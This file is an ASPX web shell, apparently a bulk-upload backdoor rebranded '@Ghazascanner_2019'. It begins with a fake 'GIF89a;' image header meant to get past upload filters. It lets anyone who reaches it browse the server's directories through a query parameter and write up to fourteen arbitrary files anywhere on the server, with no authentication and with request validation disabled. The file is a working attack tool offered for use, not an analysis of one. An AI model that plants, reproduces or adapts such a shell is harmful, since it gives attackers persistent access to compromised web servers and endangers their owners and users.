GIF89a;
<%-- ASPX Shell by LT <bu9p3t@gmail.com> (2007) --%>
<%@ Page Language="C#" EnableViewState="false" ValidateRequest="false" %>
<%@ Import Namespace="System.Web.UI.WebControls" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Collections.Generic" %>
<%--<%@ Import Namespace="System.DirectoryServices" %>--%>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>

<%
	string outstr = "";
	
	// get pwd
	string dir = Page.MapPath(".") + "/";
	if (Request.QueryString["fdir"] != null)
		dir = Request.QueryString["fdir"] + "/";
	dir = dir.Replace("\\", "/");
	dir = dir.Replace("//", "/");
	
	// build nav for path literal
	string[] dirparts = dir.Split('/');
	string linkwalk = "";	
	foreach (string curpart in dirparts)
	{
		if (curpart.Length == 0)
			continue;
		linkwalk += curpart + "/";
		outstr += string.Format("<a href='?fdir={0}'>{1}/</a>",
									HttpUtility.UrlEncode(linkwalk),
									HttpUtility.HtmlEncode(curpart));
	}

	

	// receive files ?
	if(flUp.HasFile)
	{
		string fileName = flUp.FileName;
		int splitAt = flUp.FileName.LastIndexOfAny(new char[] { '/', '\\' });
		if (splitAt >= 0)
			fileName = flUp.FileName.Substring(splitAt);
		flUp.SaveAs(dir + "/" + fileName);
	}
	if(flUp2.HasFile)
	{
		string fileName = flUp2.FileName;
		int splitAt = flUp2.FileName.LastIndexOfAny(new char[] { '/', '\\' });
		if (splitAt >= 0)
			fileName = flUp2.FileName.Substring(splitAt);
		flUp2.SaveAs(dir + "/" + fileName);
	}
	if(flUp3.HasFile)
	{
		string fileName = flUp3.FileName;
		int splitAt = flUp3.FileName.LastIndexOfAny(new char[] { '/', '\\' });
		if (splitAt >= 0)
			fileName = flUp3.FileName.Substring(splitAt);
		flUp3.SaveAs(dir + "/" + fileName);
	}
	if(flUp4.HasFile)
	{
		string fileName = flUp4.FileName;
		int splitAt = flUp4.FileName.LastIndexOfAny(new char[] { '/', '\\' });
		if (splitAt >= 0)
			fileName = flUp4.FileName.Substring(splitAt);
		flUp4.SaveAs(dir + "/" + fileName);
	}
	if(flUp5.HasFile)
	{
		string fileName = flUp5.FileName;
		int splitAt = flUp5.FileName.LastIndexOfAny(new char[] { '/', '\\' });
		if (splitAt >= 0)
			fileName = flUp5.FileName.Substring(splitAt);
		flUp5.SaveAs(dir + "/" + fileName);
	}
	if(flUp6.HasFile)
	{
		string fileName = flUp6.FileName;
		int splitAt = flUp6.FileName.LastIndexOfAny(new char[] { '/', '\\' });
		if (splitAt >= 0)
			fileName = flUp6.FileName.Substring(splitAt);
		flUp6.SaveAs(dir + "/" + fileName);
	}
	if(flUp7.HasFile)
	{
		string fileName = flUp7.FileName;
		int splitAt = flUp7.FileName.LastIndexOfAny(new char[] { '/', '\\' });
		if (splitAt >= 0)
			fileName = flUp7.FileName.Substring(splitAt);
		flUp7.SaveAs(dir + "/" + fileName);
	}
	if(flUp8.HasFile)
	{
		string fileName = flUp8.FileName;
		int splitAt = flUp8.FileName.LastIndexOfAny(new char[] { '/', '\\' });
		if (splitAt >= 0)
			fileName = flUp8.FileName.Substring(splitAt);
		flUp8.SaveAs(dir + "/" + fileName);
	}
	if(flUp9.HasFile)
	{
		string fileName = flUp9.FileName;
		int splitAt = flUp9.FileName.LastIndexOfAny(new char[] { '/', '\\' });
		if (splitAt >= 0)
			fileName = flUp9.FileName.Substring(splitAt);
		flUp9.SaveAs(dir + "/" + fileName);
	}
	if(flUp10.HasFile)
	{
		string fileName = flUp10.FileName;
		int splitAt = flUp10.FileName.LastIndexOfAny(new char[] { '/', '\\' });
		if (splitAt >= 0)
			fileName = flUp10.FileName.Substring(splitAt);
		flUp10.SaveAs(dir + "/" + fileName);
	}
	if(flUp11.HasFile)
	{
		string fileName = flUp11.FileName;
		int splitAt = flUp11.FileName.LastIndexOfAny(new char[] { '/', '\\' });
		if (splitAt >= 0)
			fileName = flUp11.FileName.Substring(splitAt);
		flUp11.SaveAs(dir + "/" + fileName);
	}
	if(flUp12.HasFile)
	{
		string fileName = flUp12.FileName;
		int splitAt = flUp12.FileName.LastIndexOfAny(new char[] { '/', '\\' });
		if (splitAt >= 0)
			fileName = flUp12.FileName.Substring(splitAt);
		flUp12.SaveAs(dir + "/" + fileName);
	}
	if(flUp13.HasFile)
	{
		string fileName = flUp13.FileName;
		int splitAt = flUp13.FileName.LastIndexOfAny(new char[] { '/', '\\' });
		if (splitAt >= 0)
			fileName = flUp13.FileName.Substring(splitAt);
		flUp13.SaveAs(dir + "/" + fileName);
	}
	if(flUp14.HasFile)
	{
		string fileName = flUp14.FileName;
		int splitAt = flUp14.FileName.LastIndexOfAny(new char[] { '/', '\\' });
		if (splitAt >= 0)
			fileName = flUp14.FileName.Substring(splitAt);
		flUp.SaveAs(dir + "/" + fileName);
	}
	
	%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" >
<head>
	<title>ASPX Shell</title>
    <meta name="robots" content="noindex" />
	<style>
        body{
            font-family: "Racing Sans One", cursive;
            background-color: #e6e6e6;
            text-shadow:0px 0px 1px #757575;
            margin: 0;
        }
		</style>
    <script type="text/javascript">
     function escapeHTMLEncode(str) {
  var div = document.createElement('div');
  var text = document.createTextNode(str);
  div.appendChild(text);
  return div.innerHTML;
 }
    </script>



</head>
<body>
	<h1></h1>
    <form id="form1" runat="server">

<h1><font color=red>@Ghazascanner</font>_2019runbot</h1>


				
	



				<p>Upload to this directory:<br />
				<asp:FileUpload runat="server" ID="flUp" />
				<asp:FileUpload runat="server" ID="flUp2" />
				<asp:FileUpload runat="server" ID="flUp3" />
				<asp:FileUpload runat="server" ID="flUp4" />
				<asp:FileUpload runat="server" ID="flUp5" />

				<asp:FileUpload runat="server" ID="flUp6" />
				<asp:FileUpload runat="server" ID="flUp7" />

				<asp:FileUpload runat="server" ID="flUp8" />
				<asp:FileUpload runat="server" ID="flUp9" />
				<asp:FileUpload runat="server" ID="flUp10" />
				<asp:FileUpload runat="server" ID="flUp11" />
				<asp:FileUpload runat="server" ID="flUp12" />

				<asp:FileUpload runat="server" ID="flUp13" />
				<asp:FileUpload runat="server" ID="flUp14" />
				
				<asp:Button runat="server" ID="cmdUpload" Text="Upload" />
				</p>


    </form>
<font color=red>@Ghazascanner</font>_2019bulkuploadaspx
</body>
</html>